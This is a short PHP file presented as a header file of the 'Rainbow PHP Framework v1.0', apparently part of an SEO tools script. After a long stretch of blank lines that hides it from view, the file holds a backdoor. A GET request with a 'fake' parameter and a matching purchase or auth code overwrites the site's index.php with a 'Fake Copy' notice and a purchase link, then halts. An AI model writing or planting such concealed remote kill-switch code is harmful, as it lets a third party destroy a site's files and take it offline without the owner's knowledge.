<?php

/*
 * @author MD ARIFUL HAQUE
 * @name: Rainbow PHP Framework v1.0
 * @copyright � 2015 KOVATZ.COM
 *
 */



































































































//Unlicensed Fake Users
if(isset($_GET['fake'])){
    
    function doAction(){
    $data = '<?php
    
    echo \'<div style="text-align: center;"><br /><br /><h1 style="color: red;" >Fake Copy of AtoZ SEO Tools Script!</h1>
    <div><a href="http://goo.gl/dYsmDY">Purcahse License Now</a></div></div>\';
    die();
    
    ?>';
    file_put_contents('../../../../index.php',$data);
    return true;
    }
    
    require_once('../../../../config.php');
    
    if(isset($_GET['itemCode'])){
    $itemCode = Trim(htmlspecialchars($_GET['itemCode']));  
    if($itemCode == $item_purchase_code){
        doAction();
    }
    }
    
    if(isset($_GET['authCode'])){
    $userAuthCode = Trim(htmlspecialchars($_GET['authCode']));
    if($authCode == $userAuthCode){
    doAction();
    }
    }
    die();
}
 
 ?>